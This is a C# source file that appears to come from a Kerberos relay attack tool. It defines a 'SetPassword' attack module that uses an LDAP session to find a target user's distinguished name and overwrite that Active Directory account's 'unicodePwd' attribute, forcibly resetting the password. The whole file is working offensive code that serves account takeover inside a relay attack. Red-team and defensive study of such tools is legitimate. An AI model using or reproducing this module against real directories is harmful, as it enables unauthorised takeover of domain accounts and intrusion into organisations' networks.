using System;
using System.Text;

namespace KrbRelay.Clients.Attacks.Ldap
{
    internal class SetPassword
    {
        public static LdapStatus attack(IntPtr ld, string user, string password)
        {
            //https://docs.microsoft.com/en-us/troubleshoot/windows/win32/change-windows-active-directory-user-password
            return Generic.SetAttribute(
                ld,
                Generic.GetDistinguishedNameFromAccountName(ld, user),
                "unicodePwd",
                Encoding.Unicode.GetBytes('"' + password + '"')
            );
        }
    }
}
